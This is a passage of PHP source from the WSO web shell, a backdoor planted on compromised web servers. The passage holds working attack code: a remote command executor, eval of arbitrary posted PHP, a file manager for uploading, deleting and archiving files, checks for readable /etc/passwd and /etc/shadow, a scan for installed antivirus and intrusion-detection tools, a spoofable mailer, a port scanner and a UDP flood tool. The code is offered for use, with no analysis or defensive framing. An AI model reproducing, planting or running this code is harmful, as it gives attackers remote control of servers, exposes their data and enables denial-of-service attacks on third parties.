       . '&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange="g(null,null,null,null,null,this.value)"&gt;&lt;optgroup label="Page charset"&gt;' . $opt_charsets . '&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;' . @$_SERVER["SERVER_ADDR"] . '&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;' . $_SERVER['REMOTE_ADDR'] . '&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'
       . '&lt;table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;' . $menu . '&lt;/tr&gt;&lt;/table&gt;&lt;div style="margin:5"&gt;';
}

function wsoFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" &lt;font color='#25ff00'&gt;(Writeable)&lt;/font&gt;":" &lt;font color=red&gt;(Not writable)&lt;/font&gt;";
    echo "

&lt;/div&gt;
&lt;table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'&gt;
	&lt;tr&gt;
		&lt;td&gt;&lt;form onsubmit='g(null,this.c.value,\"\");return false;'&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
		&lt;td&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
	&lt;/tr&gt;&lt;tr&gt;
		&lt;td&gt;&lt;form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"&gt;&lt;span&gt;Make dir:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=text name=d&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
		&lt;td&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"&gt;&lt;span&gt;Make file:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;

	&lt;/tr&gt;&lt;tr&gt;
		&lt;td&gt;&lt;form onsubmit=\"g('Console',null,this.c.value);return false;\"&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
		&lt;td&gt;&lt;form method='post' ENCTYPE='multipart/form-data'&gt;
		&lt;input type=hidden name=a value='FilesMAn'&gt;
		&lt;input type=hidden name=c value='" . $GLOBALS['cwd'] ."'&gt;
		&lt;input type=hidden name=p1 value='uploadFile'&gt;
		&lt;input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'&gt;
		&lt;span&gt;Upload file:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=file name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;br  &gt;&lt;/td&gt;

	&lt;/tr&gt;&lt;/table&gt;&lt;center&gt;WSO Bugabuse.net edition - Modified by Led-Zeppelin&lt;/center&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;";
}

if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) {
    function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) {
    function posix_getgrgid($p) {return false;} }

function wsoEx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
function wsoViewSize($s) {
	if($s &gt;= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s &gt;= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s &gt;= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

function wsoPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}

function wsoPermsColor($f) {
	if (!@is_readable($f))
		return '&lt;font color=#FF0000&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
	elseif (!@is_writable($f))
		return '&lt;font color=white&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
	else
		return '&lt;font color=#25ff00&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
}

if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh)))
    		$files[] = $filename;
		return $files;
	}
}

function wsoWhich($p) {
	$path = wsoEx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}

function actionSecInfo() {
	wsoHeader();
	echo '&lt;h1&gt;Server security information&lt;/h1&gt;&lt;div class=content&gt;';
	function wsoSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '&lt;span&gt;' . $n . ': &lt;/span&gt;';
			if(strpos($v, "\n") === false)
				echo $v . '&lt;br&gt;';
			else
				echo '&lt;pre class=ml1&gt;' . $v . '&lt;/pre&gt;';
		}
	}

	wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	wsoSecParam('Open base dir', @ini_get('open_basedir'));
	wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	wsoSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	wsoSecParam('Supported databases', implode(', ', $temp));
	echo '&lt;br&gt;';

	if($GLOBALS['os'] == 'nix') {
		wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes &lt;a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'&gt;[view]&lt;/a&gt;":'no');
		wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes &lt;a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'&gt;[view]&lt;/a&gt;":'no');
		wsoSecParam('OS version', @file_get_contents('/proc/version'));
		wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
		if(!$GLOBALS['safe_mode']) {
            $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
            $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
            $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
			echo '&lt;br&gt;';
			$temp=array();
			foreach ($userful as $item)
				if(wsoWhich($item))
                    $temp[] = $item;
			wsoSecParam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(wsoWhich($item))
                    $temp[] = $item;
			wsoSecParam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item)
				if(wsoWhich($item))
                    $temp[] = $item;
			wsoSecParam('Downloaders', implode(', ',$temp));
			echo '&lt;br/&gt;';
            wsoSecParam('HDD space', wsoEx('df -h'));
			wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
		}
	} else {
		wsoSecParam('OS Version',wsoEx('ver'));
		wsoSecParam('Account Settings',wsoEx('net accounts'));
		wsoSecParam('User Accounts',wsoEx('net user'));
	}
	echo '&lt;/div&gt;';
	wsoFooter();
}

function actionphptools() {
wsoHeader();
?>&lt;center&gt;<?php
//mailer
echo '&lt;b&gt;Mailer&lt;/b&gt;&lt;br&gt;
&lt;form action="'.$surl.'" method=POST&gt;
&lt;input type="hidden" name="a" value="phptools"&gt;
&lt;input type=text name=to value=to&gt;&lt;br&gt;
&lt;input type=text name=from value=from&gt;&lt;br&gt;
&lt;input type=text name=subject value=subject&gt;&lt;br&gt;
&lt;input type=text name=body value=body&gt;&lt;br&gt;
&lt;input type=submit name=submit value=Submit&gt;&lt;/form&gt;';
if (isset($_POST['to']) && isset($_POST['from']) && isset($_POST['subject']) && isset($_POST['body'])) {
	$headers = 'From: '.$_POST['from'];
	mail ($_POST['to'],$_POST['subject'],$_POST['body'],$headers);
	echo 'Email sent.';
}

//port scanner
echo '&lt;br&gt;&lt;b&gt;Port Scanner&lt;/b&gt;&lt;br&gt;';
$start = strip_tags($_POST['start']);
$end = strip_tags($_POST['end']);
$host = strip_tags($_POST['host']);

if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
for($i = $start; $i&lt;=$end; $i++){
	$fp = @fsockopen($host, $i, $errno, $errstr, 3);
	if($fp){
		echo 'Port '.$i.' is &lt;font color=green&gt;open&lt;/font&gt;&lt;br&gt;';
	}
	flush();
	}
}else{
?>
&lt;form action="?" method="POST"&gt;
&lt;input type="hidden" name="a" value="phptools"&gt;
Host:&lt;br /&gt;
&lt;input type="text" name="host" value="localhost"/&gt;&lt;br /&gt;
Port start:&lt;br /&gt;
&lt;input type="text" name="start" value="0"/&gt;&lt;br /&gt;
Port end:&lt;br /&gt;
&lt;input type="text" name="end" value="5000"/&gt;&lt;br /&gt;
&lt;input type="submit" value="Scan Ports" /&gt;
&lt;/form&gt;
<?php
}

//UDP
if(isset($_POST['host'])&&is_numeric($_POST['time'])){
	$pakits = 0;
	ignore_user_abort(TRUE);
	set_time_limit(0);
	
	$exec_time = $_POST['time'];
	
	$time = time();
	//print "Started: ".time('h:i:s')."&lt;br&gt;";
	$max_time = $time+$exec_time;

	$host = $_POST['host'];
	
	for($i=0;$i&lt;65000;$i++){
			$out .= 'X';
	}
	while(1){
	$pakits++;
			if(time() &gt; $max_time){
					break;
			}
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp){
					fwrite($fp, $out);
					fclose($fp);
			}
	}
	echo "&lt;br&gt;&lt;b&gt;UDP Flood&lt;/b&gt;&lt;br&gt;Completed with $pakits (" . round(($pakits*65)/1024, 2) . " MB) packets averaging ". round($pakits/$exec_time, 2) . " packets per second \n";
	echo '&lt;br&gt;&lt;br&gt;
		&lt;form action="'.$surl.'" method=POST&gt;
		&lt;input type="hidden" name="a" value="phptools"&gt;
		Host: &lt;input type=text name=host value=localhost&gt;
		Length (seconds): &lt;input type=text name=time value=9999&gt;
		&lt;input type=submit value=Go&gt;&lt;/form&gt;';
}else{ echo '&lt;br&gt;&lt;b&gt;UDP Flood&lt;/b&gt;&lt;br&gt;
			&lt;form action=? method=POST&gt;
			&lt;input type="hidden" name="a" value="phptools"&gt;
			Host: &lt;br&gt;&lt;input type=text name=host value=localhost&gt;&lt;br&gt;
			Length (seconds): &lt;br&gt;&lt;input type=text name=time value=9999&gt;&lt;br&gt;
			&lt;input type=submit value=Go&gt;&lt;/form&gt;';
}
?>&lt;/center&gt;<?php
wsoFooter();}
function actionPhp() {
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'&#92;&#48;") . "';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
	wsoHeader();
	if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '&lt;h1&gt;PHP info&lt;/h1&gt;&lt;div class=content&gt;&lt;style&gt;.p {color:#000;}&lt;/style&gt;';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('&lt;h1','&lt;h2', $tmp) .'&lt;/div&gt;&lt;br&gt;';
	}
	if(empty($_POST['ajax']) && !empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
    echo '&lt;h1&gt;Execution PHP-code&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'&lt;/textarea&gt;&lt;input type=submit value=Eval style="margin-top:5px"&gt;';
	echo ' &lt;input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'&gt; send using AJAX&lt;/form&gt;&lt;pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1&gt;';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '&lt;/pre&gt;&lt;/div&gt;';
	wsoFooter();
}

function actionFilesMan() {
	wsoHeader();
	echo '&lt;h1&gt;File manager&lt;/h1&gt;&lt;div class=content&gt;&lt;script&gt;p1_=p2_=p3_="";&lt;/script&gt;';
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					@rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
                        if($f == '..')
                            continue;
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_SESSION['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_SESSION['f'] as $f)
						copy_paste($_SESSION['c'],$f, $GLOBALS['cwd']);
				} elseif($_SESSION['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(@is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_SESSION['f'] as $f)
						@rename($_SESSION['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_SESSION['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip-&gt;open($_POST['p2'], 1)) {
                            chdir($_SESSION['c']);
                            foreach($_SESSION['f'] as $f) {
                                if($f == '..')
                                    continue;
                                if(@is_file($_SESSION['c'].$f))
                                    $zip-&gt;addFile($_SESSION['c'].$f, $f);
                                elseif(@is_dir($_SESSION['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
                                    foreach ($iterator as $key=&gt;$value) {
                                        $zip-&gt;addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip-&gt;close();
                        }
                    }
				} elseif($_SESSION['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_SESSION['f'] as $f) {
                            if($zip-&gt;open($_SESSION['c'].$f)) {
                                $zip-&gt;extractTo($GLOBALS['cwd']);
                                $zip-&gt;close();
                            }
                        }
                    }
				} elseif($_SESSION['act'] == 'tar') {
                    chdir($_SESSION['c']);
                    $_SESSION['f'] = array_map('escapeshellarg', $_SESSION['f']);
                    wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_SESSION['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_SESSION['f']);
				break;
			default:
                if(!empty($_POST['p1'])) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k =&gt; $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['c'] = @$_POST['c'];
				}
				break;
		}
	}
	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';wsoFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "&lt;script&gt;
	function sa() {
		for(i=0;i&lt;d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}

&lt;/script&gt;
&lt;table width='100%' class='main' cellspacing='0' cellpadding='2'&gt;
&lt;form name=files method=post&gt;&lt;tr&gt;&lt;th width='13px'&gt;&lt;input type=checkbox onclick='sa()' class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i&lt;$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' =&gt; $dirContent[$i],
					 'path' =&gt; $GLOBALS['cwd'].$dirContent[$i],
					 'modify' =&gt; date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' =&gt; wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' =&gt; @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' =&gt; $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' =&gt; $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' =&gt; 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' =&gt; 'link', 'link' =&gt; readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' =&gt; 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function wsoCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] &lt; $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "wsoCmp");
	usort($dirs, "wsoCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '&lt;tr'.($l?' class=l1':'').'&gt;&lt;td&gt;&lt;input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')"&gt;'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" title=' . $f['link'] . '&gt;&lt;b&gt;[ ' . htmlspecialchars($f['name']) . ' ]&lt;/b&gt;').'&lt;/a&gt;&lt;/td&gt;&lt;td&gt;'.(($f['type']=='file')?wsoViewSize($f['size']):$f['type']).'&lt;/td&gt;&lt;td&gt;'.$f['modify'].'&lt;/td&gt;&lt;td&gt;'.$f['owner'].'/'.$f['group'].'&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')"&gt;'.$f['perms']
			.'&lt;/td&gt;&lt;td&gt;&lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')"&gt;R&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')"&gt;T&lt;/a&gt;'.(($f['type']=='file')?' &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')"&gt;E&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')"&gt;D&lt;/a&gt;':'').'&lt;/td&gt;&lt;/tr&gt;';
		$l = $l?0:1;
	}
	echo "&lt;tr&gt;&lt;td colspan=7&gt;

	&lt;input type=hidden name=a value='FilesMan'&gt;
	&lt;input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'&gt;
	&lt;input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'&gt;
	&lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;";
    if(class_exists('ZipArchive'))
        echo "&lt;option value='zip'&gt;Compress (zip)&lt;/option&gt;&lt;option value='unzip'&gt;Uncompress (zip)&lt;/option&gt;";
    echo "&lt;option value='tar'&gt;Compress (tar.gz)&lt;/option&gt;";
    if(!empty($_SESSION['act']) && @count($_SESSION['f']))
        echo "&lt;option value='paste'&gt;Paste / Compress&lt;/option&gt;";
    echo "&lt;/select&gt;&nbsp;";
    if(!empty($_SESSION['act']) && @count($_SESSION['f']) && (($_SESSION['act'] == 'zip') || ($_SESSION['act'] == 'tar')))
        echo "file name: &lt;input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_SESSION['act'] == 'zip'?'zip':'tar.gz') . "'&gt;&nbsp;";
    echo "&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/div&gt;";
	wsoFooter();
}

function actionStringTools() {
	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i&lt;strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= sprintf('X',ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	$stringTools = array(
		'Base64 encode' =&gt; 'base64_encode',
		'Base64 decode' =&gt; 'base64_decode',
		'Url encode' =&gt; 'urlencode',
		'Url decode' =&gt; 'urldecode',
		'Full urlencode' =&gt; 'full_urlencode',
		'md5 hash' =&gt; 'md5',
		'sha1 hash' =&gt; 'sha1',
		'crypt' =&gt; 'crypt',
		'CRC32' =&gt; 'crc32',
		'ASCII to HEX' =&gt; 'ascii2hex',
		'HEX to ASCII' =&gt; 'hex2ascii',
		'HEX to DEC' =&gt; 'hexdec',
		'HEX to BIN' =&gt; 'hex2bin',
		'DEC to HEX' =&gt; 'dechex',
		'DEC to BIN' =&gt; 'decbin',
		'BIN to HEX' =&gt; 'binhex',
		'BIN to DEC' =&gt; 'bindec',
		'String to lower case' =&gt; 'strtolower',
		'String to upper case' =&gt; 'strtoupper',
		'Htmlspecialchars' =&gt; 'htmlspecialchars',
		'String length' =&gt; 'strlen',
	);
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		if(in_array($_POST['p1'], $stringTools))
			echo $_POST['p1']($_POST['p2']);
		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'&#92;&#48;")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
	wsoHeader();
	echo '&lt;h1&gt;String conversions&lt;/h1&gt;&lt;div class=content&gt;';
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo "&lt;form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'&gt;&lt;select name='selectTool'&gt;";
	foreach($stringTools as $k =&gt; $v)
		echo "&lt;option value='".htmlspecialchars($v)."'&gt;".$k."&lt;/option&gt;";
		echo "&lt;/select&gt;&lt;input type='submit' value='&gt;&gt;'/&gt; &lt;input type=checkbox name=ajax value=1 ".(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."&gt; send using AJAX&lt;br&gt;&lt;textarea name='input' style='margin-top:5px' class=bigarea&gt;".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."&lt;/textarea&gt;&lt;/form&gt;&lt;pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'&gt;";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search text in files:&lt;/h1&gt;&lt;div class=content&gt;

		&lt;form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"&gt;&lt;table cellpadding='1' cellspacing='0' width='50%'&gt;
			&lt;tr&gt;&lt;td width='1%'&gt;Text:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='text' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Path:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Name:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='filename' value='*' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt;
